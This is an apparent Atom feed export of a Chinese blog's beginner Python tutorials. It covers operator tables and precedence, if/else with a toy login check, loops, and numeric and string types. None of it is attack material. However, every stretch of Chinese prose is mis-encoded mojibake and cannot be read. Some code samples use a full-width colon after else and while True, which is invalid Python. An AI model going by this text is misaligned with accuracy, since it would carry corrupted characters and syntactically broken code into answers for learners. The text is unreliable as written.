å¦åˆ™ä¸º0</td><td>(a &amp; b) è¾“å‡ºç»“æœ 12  , äºŒè¿›åˆ¶è§£é‡Š :  0000 1100</td></tr><tr><td>\</td><td>æŒ‰ä½æˆ–è¿ç®—ç¬¦ : åªè¦å¯¹åº”çš„äºŒä¸ªäºŒè¿›ä½æœ‰ä¸€ä¸ªä¸º1æ—¶ , ç»“æœä½å°±ä¸º1</td><td>(a  ä¸¨ b) è¾“å‡ºç»“æœ 61  , äºŒè¿›åˆ¶è§£é‡Š :  0011 1101</td></tr><tr><td>^</td><td>æŒ‰ä½å¼‚æˆ–è¿ç®—ç¬¦ : å½“ä¸¤å¯¹åº”çš„äºŒè¿›ä½ç›¸å¼‚æ—¶ , ç»“æœä¸º1</td><td>(a ^ b) è¾“å‡ºç»“æœ 49  , äºŒè¿›åˆ¶è§£é‡Š :  0011 0001</td></tr><tr><td>~</td><td>æŒ‰ä½å–åè¿ç®—ç¬¦ : å¯¹æ•°æ®çš„æ¯ä¸ªäºŒè¿›åˆ¶ä½å–å , å³æŠŠ1å˜ä¸º0 , æŠŠ0å˜ä¸º1  , ~x ç±»ä¼¼äº -x-1</td><td>(~a ) è¾“å‡ºç»“æœ -61  , äºŒè¿›åˆ¶è§£é‡Š :  1100 0011 , åœ¨ä¸€ä¸ªæœ‰ç¬¦å·äºŒè¿›åˆ¶æ•°çš„è¡¥ç å½¢å¼</td></tr><tr><td>&lt;&lt;</td><td>å·¦ç§»åŠ¨è¿ç®—ç¬¦ : è¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å·¦ç§»è‹¥å¹²ä½ , ç”± &lt;&lt; å³è¾¹çš„æ•°å­—æŒ‡å®šäº†ç§»åŠ¨çš„ä½æ•° , é«˜ä½ä¸¢å¼ƒ , ä½ä½è¡¥0</td><td>a &lt;&lt; 2 è¾“å‡ºç»“æœ 240 , äºŒè¿›åˆ¶è§£é‡Š :  1111 0000</td></tr><tr><td>&gt;&gt;</td><td>å³ç§»åŠ¨è¿ç®—ç¬¦ : æŠŠâ€&gt;&gt;â€å·¦è¾¹çš„è¿ç®—æ•°çš„å„äºŒè¿›ä½å…¨éƒ¨å³ç§»è‹¥å¹²ä½ , &gt;&gt; å³è¾¹çš„æ•°å­—æŒ‡å®šäº†ç§»åŠ¨çš„ä½æ•°</td><td>a &gt;&gt; 2 è¾“å‡ºç»“æœ 15  , äºŒè¿›åˆ¶è§£é‡Š :  0000 1111</td></tr></tbody></table><p>é€»è¾‘è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>é€»è¾‘è¡¨è¾¾å¼</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>and</td><td>x and y</td><td>å¸ƒå°”â€ä¸â€ - å¦‚æœ x ä¸º False , x and y è¿”å› False , å¦åˆ™å®ƒè¿”å› y çš„è®¡ç®—å€¼</td><td>(a and b) è¿”å› 20</td></tr><tr><td>or</td><td>x or y</td><td>å¸ƒå°”â€æˆ–â€    - å¦‚æœ x æ˜¯é 0 , å®ƒè¿”å› x çš„å€¼ , å¦åˆ™å®ƒè¿”å› y çš„è®¡ç®—å€¼</td><td>(a or b) è¿”å› 10</td></tr><tr><td>not</td><td>not x</td><td>å¸ƒå°”â€éâ€ - å¦‚æœ x ä¸º True , è¿”å› False  , å¦‚æœ x ä¸º False , å®ƒè¿”å› True</td><td>not(a and b) è¿”å› False</td></tr></tbody></table><p>æˆå‘˜è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>in</td><td>å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ‰¾åˆ°å€¼è¿”å› True , å¦åˆ™è¿”å› False</td><td>x åœ¨ y åºåˆ—ä¸­ , å¦‚æœ x åœ¨ y åºåˆ—ä¸­è¿”å› True</td></tr><tr><td>not in</td><td>å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ²¡æœ‰æ‰¾åˆ°å€¼è¿”å› True , å¦åˆ™è¿”å› False</td><td>x ä¸åœ¨ y åºåˆ—ä¸­ , å¦‚æœ x ä¸åœ¨ y åºåˆ—ä¸­è¿”å› True</td></tr></tbody></table><p>èº«ä»½è¿ç®—ç¬¦</p><table><thead><tr><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr><td>is</td><td>is æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨è‡ªä¸€ä¸ªå¯¹è±¡</td><td><strong>x is y </strong> , ç±»ä¼¼ <strong>id(x) == id(y)</strong> , å¦‚æœå¼•ç”¨çš„æ˜¯åŒä¸€ä¸ªå¯¹è±¡åˆ™è¿”å› True , å¦åˆ™è¿”å› False</td></tr><tr><td>is not</td><td>is not æ˜¯åˆ¤æ–­ä¸¤ä¸ªæ ‡è¯†ç¬¦æ˜¯ä¸æ˜¯å¼•ç”¨è‡ªä¸åŒå¯¹è±¡</td><td><strong>x is not y</strong>  ,  ç±»ä¼¼ **id(a) != id(b) , å¦‚æœå¼•ç”¨çš„ä¸æ˜¯åŒä¸€ä¸ªå¯¹è±¡åˆ™è¿”å›ç»“æœ True , å¦åˆ™è¿”å› False</td></tr></tbody></table><p>è¿ç®—ç¬¦ä¼˜å…ˆçº§è¡¨ , ä»ä¸Šåˆ°ä¸‹ä¼˜å…ˆçº§ä¾æ¬¡å¢é«˜</p><table><thead><tr><th>Operator</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#lambda" target="_blank" rel="noopener"><code>lambda</code></a></td><td>Lambda expression</td></tr><tr><td><a href="https://docs.python.org/3/reference/compound_stmts.html#if" target="_blank" rel="noopener"><code>if</code></a> â€“ <a href="https://docs.python.org/3/reference/compound_stmts.html#else" target="_blank" rel="noopener"><code>else</code></a></td><td>Conditional expression</td></tr><tr><td><a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#or" target="_blank" rel="noopener"><code>or</code></a></td><td>Boolean OR</td></tr><tr><td><a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#and" target="_blank" rel="noopener"><code>and</code></a></td><td>Boolean AND</td></tr><tr><td><a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#not" target="_blank" rel="noopener"><code>not</code></a> <code>x</code></td><td>Boolean NOT</td></tr><tr><td><a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#in" target="_blank" rel="noopener"><code>in</code></a>, <a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#not-in" target="_blank" rel="noopener"><code>not in</code></a>, <a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#is" target="_blank" rel="noopener"><code>is</code></a>, <a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#is-not" target="_blank" rel="noopener"><code>is not</code></a>, <code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>!=</code>, <code>==</code></td><td>Comparisons, including membership tests and identity tests</td></tr><tr><td><code>ä¸¨</code></td><td>Bitwise OR</td></tr><tr><td><code>^</code></td><td>Bitwise XOR</td></tr><tr><td><code>&amp;</code></td><td>Bitwise AND</td></tr><tr><td><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td><td>Shifts</td></tr><tr><td><code>+</code>, <code>-</code></td><td>Addition and subtraction</td></tr><tr><td><code>*</code>, <code>@</code>, <code>/</code>, <code>//</code>, <code>%</code></td><td>Multiplication, matrix multiplication, division, floor division, remainder <a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#id21" target="_blank" rel="noopener">[5]</a></td></tr><tr><td><code>+x</code>, <code>-x</code>, <code>~x</code></td><td>Positive, negative, bitwise NOT</td></tr><tr><td><code>**</code></td><td>Exponentiation <a href="https://docs.python.org/3/reference/expressions.html?highlight=operator%20precedence#id22" target="_blank" rel="noopener">[6]</a></td></tr><tr><td><code>await</code> <code>x</code></td><td>Await expression</td></tr><tr><td><code>x[index]</code>, <code>x[index:index]</code>, <code>x(arguments...)</code>, <code>x.attribute</code></td><td>Subscription, slicing, call, attribute reference</td></tr><tr><td><code>(expressions...)</code>, <code>[expressions...]</code>, <code>{key: value...}</code>, <code>{expressions...}</code></td><td>Binding or tuple display, list display, dictionary display, set display</td></tr></tbody></table><h2 id="if-â€¦-else-ğŸ€"><a href="#if-â€¦-else-ğŸ€" class="headerlink" title="if â€¦ else  ğŸ€"></a>if â€¦ else  ğŸ€</h2><p>åœºæ™¯ä¸€ : ç”¨æˆ·ç™»å½•éªŒè¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯¼å…¥getpassæ¨¡å—</span></span><br><span class="line"><span class="keyword">import</span> getpass</span><br><span class="line"><span class="comment"># ç­‰å¾…ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">name = input(<span class="string">"è¯·è¾“å…¥ç”¨æˆ·åï¼š"</span>)</span><br><span class="line"><span class="comment"># ç­‰å¾…ç”¨æˆ·è¾“å…¥å¯†ç ,å¯†ç ä¸å¯è§</span></span><br><span class="line">password = getpass.getpass(<span class="string">"è¯·è¾“å…¥å¯†ç ï¼š"</span>)</span><br><span class="line"><span class="comment"># å¦‚æœç”¨æˆ·å¯†ç æ­£ç¡®,æ‰§è¡Œå¦‚ä¸‹</span></span><br><span class="line"><span class="keyword">if</span> name ==<span class="string">"Lyon"</span> <span class="keyword">and</span> password ==<span class="string">"yang"</span>:</span><br><span class="line">    print(<span class="string">"æ¬¢è¿ä½ !"</span>)</span><br><span class="line"><span class="comment"># å¦åˆ™æ‰§è¡Œå¦‚ä¸‹</span></span><br><span class="line"><span class="keyword">else</span>ï¼š</span><br><span class="line">    print(<span class="string">"ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯"</span>)</span><br></pre></td></tr></table></figure><p>åœºæ™¯äºŒ : çŒœå¹´é¾„æ¸¸æˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å®šä¹‰ä¸€ä¸ªå¹´é¾„</span></span><br><span class="line">age =<span class="number">21</span> </span><br><span class="line"><span class="comment"># ç”¨æˆ·è¾“å…¥</span></span><br><span class="line">user_input = int(input(<span class="string">"input your guess num:"</span>))</span><br><span class="line"><span class="keyword">if</span> user_input == age:</span><br><span class="line">    print(<span class="string">"Congratulations, you got it !"</span>)</span><br><span class="line"><span class="keyword">elif</span> user_input &lt; age:</span><br><span class="line">    print(<span class="string">"Oops,think bigger!"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"think smaller!"</span>)</span><br></pre></td></tr></table></figure><h2 id="forå¾ªç¯-ğŸ€"><a href="#forå¾ªç¯-ğŸ€" class="headerlink" title="forå¾ªç¯  ğŸ€"></a>forå¾ªç¯  ğŸ€</h2><p>å¾ªç¯10æ¬¡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    print(<span class="string">"loop:"</span>, i )</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">æ‰§è¡Œç»“æœ:</span></span><br><span class="line"><span class="string">loop: 0</span></span><br><span class="line"><span class="string">loop: 1</span></span><br><span class="line"><span class="string">loop: 2</span></span><br><span class="line"><span class="string">loop: 3</span></span><br><span class="line"><span class="string">loop: 4</span></span><br><span class="line"><span class="string">loop: 5</span></span><br><span class="line"><span class="string">loop: 6</span></span><br><span class="line"><span class="string">loop: 7</span></span><br><span class="line"><span class="string">loop: 8</span></span><br><span class="line"><span class="string">loop: 9</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>å°äº5å°±è·³å…¥ä¸‹ä¸€æ¬¡å¾ªç¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="number">5</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">"loop:"</span>, i)</span><br></pre></td></tr></table></figure><h2 id="whileå¾ªç¯-ğŸ€"><a href="#whileå¾ªç¯-ğŸ€" class="headerlink" title="whileå¾ªç¯  ğŸ€"></a>whileå¾ªç¯  ğŸ€</h2><p>å†™ä¸€ä¸ªæ­»å¾ªç¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>ï¼š</span><br><span class="line">    print(<span class="string">"ä½ æ˜¯é£å„¿æˆ‘æ˜¯æ²™ï¼Œç¼ ç¼ ç»µç»µèµ°å¤©æ¶¯"</span>, count)</span><br><span class="line">    count += <span class="number">1</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Pythonä¹‹è·¯-PythonåŸºç¡€&quot;&gt;&lt;a href=&quot;#Pythonä¹‹è·¯-PythonåŸºç¡€&quot; class=&quot;headerlink&quot; title=&quot;Pythonä¹‹è·¯ - PythonåŸºç¡€&quot;&gt;&lt;/a&gt;Pythonä¹‹è·¯ - PythonåŸºç¡€&lt;/h1&gt;&lt;h2 id=&quot;Hello-World-ğŸ€&quot;&gt;&lt;a href=&quot;#Hello-World-ğŸ€&quot; class=&quot;headerlink&quot; title=&quot;Hello World  ğŸ€&quot;&gt;&lt;/a&gt;Hello World  ğŸ€&lt;/h2&gt;&lt;p&gt;å­¦ä¸€é—¨è¯­è¨€åŸºæœ¬éƒ½æ˜¯ä»Hello Worldå¼€å§‹çš„ , å¦‚ä¸‹ä¸€ä¸ªæœ€ç®€å•çš„Hello Worldç¨‹åº&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Python &lt;span class=&quot;number&quot;&gt;3.5&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.2&lt;/span&gt; (v3&lt;span class=&quot;number&quot;&gt;.5&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.2&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;def2a2901a5, Jun &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2016&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;22&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;) [MSC v&lt;span class=&quot;number&quot;&gt;.1900&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt; bit (AMD64)] on win32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type &lt;span class=&quot;string&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; more information.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;print(&lt;span class=&quot;string&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Hello World&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ­¤ä¸ºPython 3.5.2ç‰ˆæœ¬ , ä¸Šè¿°ä»£ç ä¸ºåœ¨Windowsç¯å¢ƒå‘½ä»¤è¡Œä¸­æ‰§è¡Œ , å³ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ â€œå‘½ä»¤æç¤ºç¬¦â€&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# å·²æ·»åŠ ç¯å¢ƒå˜é‡&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;C:\Windows\system32&amp;gt;python&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Python 2.7.x ç‰ˆæœ¬çš„Hello Worldç¨‹åº&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Python &lt;span class=&quot;number&quot;&gt;2.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.13&lt;/span&gt; (v2&lt;span class=&quot;number&quot;&gt;.7&lt;/span&gt;&lt;span class=&quot;number&quot;&gt;.13&lt;/span&gt;:a06454b1afa1, Dec &lt;span class=&quot;number&quot;&gt;17&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;2016&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;53&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;40&lt;/span&gt;) [MSC v&lt;span class=&quot;number&quot;&gt;.1500&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;64&lt;/span&gt; bit (AMD64)] on win32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type &lt;span class=&quot;string&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; more information.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;gt;&amp;gt;&amp;gt; &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;Hello World&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Hello World&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;å½“ç„¶ä½¿ç”¨&lt;code&gt;Python shell&lt;/code&gt; ä»…ä»…é€‚åˆå¤„ç†ä¸€äº›éå¸¸ç®€å•çš„å°ç¨‹åº , å¯¹äºæ¯”è¾ƒå¤æ‚ , ä»£ç é‡ç¨å¾®å¤§ä¸€ç‚¹çš„å°±ä¸é€‚åˆäº†&lt;/p&gt;
    
    </summary>
    
      <category term="python" scheme="https://jesse.top/categories/python/"/>
    
      <category term="basic" scheme="https://jesse.top/categories/python/basic/"/>
    
    
      <category term="python" scheme="https://jesse.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>02.Pythonä¹‹è·¯ - pythonæ•°æ®ç±»å‹å’Œå˜é‡</title>
    <link href="https://jesse.top/2020/05/26/python/01-basic/02-Python%E4%B9%8B%E8%B7%AF-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E6%A6%82%E8%BF%B0/"/>
    <id>https://jesse.top/2020/05/26/python/01-basic/02-Pythonä¹‹è·¯-æ•°æ®ç±»å‹æ¦‚è¿°/</id>
    <published>2020-05-26T14:59:58.000Z</published>
    <updated>2020-05-26T15:35:16.698Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pythonæ•°æ®ç±»å‹å’Œå˜é‡"><a href="#pythonæ•°æ®ç±»å‹å’Œå˜é‡" class="headerlink" title="pythonæ•°æ®ç±»å‹å’Œå˜é‡"></a>pythonæ•°æ®ç±»å‹å’Œå˜é‡</h3><h4 id="æ•´æ•°"><a href="#æ•´æ•°" class="headerlink" title="æ•´æ•°"></a>æ•´æ•°</h4><p>è¡¨ç¤ºæ•°å­—,åŒ…æ‹¬è´Ÿæ•°,ä¾‹å¦‚: <code>1</code>ï¼Œ<code>100</code>ï¼Œ<code>-8080</code>ï¼Œ<code>0</code>ï¼Œç­‰ç­‰ã€‚</p><h4 id="æµ®ç‚¹æ•°"><a href="#æµ®ç‚¹æ•°" class="headerlink" title="æµ®ç‚¹æ•°"></a>æµ®ç‚¹æ•°</h4><p>æµ®ç‚¹æ•°ä¹Ÿå°±æ˜¯å°æ•°,å¯ä»¥ç”¨æ•°å­—å†™æ³•,ä¾‹å¦‚<code>1.23</code>ï¼Œ<code>3.14</code>ï¼Œ<code>-9.01</code>ï¼Œç­‰ç­‰.è¦æ³¨æ„çš„æ˜¯åœ¨Pythonä¸­,é™¤æ³•çš„ç»“æœéƒ½æ˜¯æµ®ç‚¹æ•°,å³ä½¿æ˜¯è¢«æ•´é™¤,ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 9/3</span><br><span class="line">3.0</span><br><span class="line">&gt;&gt;&gt; type(9/3)</span><br><span class="line">&lt;class &apos;float&apos;&gt;</span><br></pre></td></tr></table></figure><p>åœ¨pythonä¸­,è¿˜æœ‰ä¸€ç§é™¤æ³•æ˜¯<code>//</code>ï¼Œç§°ä¸ºåœ°æ¿é™¤ï¼Œä¸¤ä¸ªæ•´æ•°çš„é™¤æ³•ä»ç„¶æ˜¯æ•´æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 10 / 3</span><br><span class="line">3.3333333333333335</span><br><span class="line">&gt;&gt;&gt; 10 // 3</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; type(10 // 3)</span><br><span class="line">&lt;class &apos;int&apos;&gt;</span><br></pre></td></tr></table></figure><p><code>//</code>é™¤æ³•åªå–ç»“æœçš„æ•´æ•°éƒ¨åˆ†ï¼Œ%åˆ™è¡¨ç¤ºå–ä½™ï¼Œå¯ä»¥å¾—åˆ°ä¸¤ä¸ªæ•´æ•°ç›¸é™¤çš„ä½™æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 10 % 3</span><br><span class="line">1</span><br></pre></td></tr></table></figure><hr><a id="more"></a><h4 id="å­—ç¬¦ä¸²"><a href="#å­—ç¬¦ä¸²" class="headerlink" title="å­—ç¬¦ä¸²"></a>å­—ç¬¦ä¸²</h4><p>å­—ç¬¦ä¸²æ˜¯ä»¥å•å¼•å·<code>&#39;</code>æˆ–åŒå¼•å·<code>&quot;</code>æ‹¬èµ·æ¥çš„ä»»æ„æ–‡æœ¬ï¼Œæ¯”å¦‚<code>&#39;abc&#39;</code>ï¼Œ<code>&quot;xyz&quot;</code>ç­‰ç­‰ã€‚è¯·æ³¨æ„ï¼Œ<code>&#39;&#39;</code>æˆ–<code>&quot;&quot;</code>æœ¬èº«åªæ˜¯ä¸€ç§è¡¨ç¤ºæ–¹å¼ï¼Œä¸æ˜¯å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤ï¼Œå­—ç¬¦ä¸²<code>&#39;abc&#39;</code>åªæœ‰<code>a</code>ï¼Œ<code>b</code>ï¼Œ<code>c</code>è¿™3ä¸ªå­—ç¬¦ã€‚å¦‚æœ<code>&#39;</code>æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œé‚£å°±å¯ä»¥ç”¨<code>&quot;&quot;</code>æ‹¬èµ·æ¥ï¼Œæ¯”å¦‚<code>&quot;I&#39;m OK&quot;</code>åŒ…å«çš„å­—ç¬¦æ˜¯<code>I</code>ï¼Œ<code>&#39;</code>ï¼Œ<code>m</code>ï¼Œç©ºæ ¼ï¼Œ<code>O</code>ï¼Œ<code>K</code>è¿™6ä¸ªå­—ç¬¦ã€‚</p><p>è½¬ä¹‰å­—ç¬¦<code>\</code>å¯ä»¥è½¬ä¹‰å¾ˆå¤šå­—ç¬¦ï¼Œæ¯”å¦‚<code>\n</code>è¡¨ç¤ºæ¢è¡Œï¼Œ<code>\t</code>è¡¨ç¤ºåˆ¶è¡¨ç¬¦ï¼Œå­—ç¬¦<code>\</code>æœ¬èº«ä¹Ÿè¦è½¬ä¹‰ï¼Œæ‰€ä»¥<code>\\</code>è¡¨ç¤ºçš„å­—ç¬¦å°±æ˜¯<code>\</code>ï¼Œå¯ä»¥åœ¨Pythonçš„äº¤äº’å¼å‘½ä»¤è¡Œç”¨<code>print()</code>æ‰“å°å­—ç¬¦ä¸²çœ‹çœ‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&apos;I\&apos;m ok.&apos;)</span><br><span class="line">I&apos;m ok.</span><br><span class="line">&gt;&gt;&gt; print(&apos;I\&apos;m learning\nPython.&apos;)</span><br><span class="line">I&apos;m learning</span><br><span class="line">Python.</span><br><span class="line">&gt;&gt;&gt; print(&apos;\\\n\\&apos;)</span><br><span class="line">\</span><br><span class="line">\</span><br></pre></td></tr></table></figure><p>Pythonè¿˜å…è®¸ç”¨<code>r&#39;&#39;</code>è¡¨ç¤º<code>&#39;&#39;</code>å†…éƒ¨çš„å­—ç¬¦ä¸²é»˜è®¤ä¸è½¬ä¹‰ï¼Œå¯ä»¥è‡ªå·±è¯•è¯•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&apos;\\\t\\&apos;)</span><br><span class="line">\       \</span><br><span class="line">&gt;&gt;&gt; print(r&apos;\\\t\\&apos;)</span><br><span 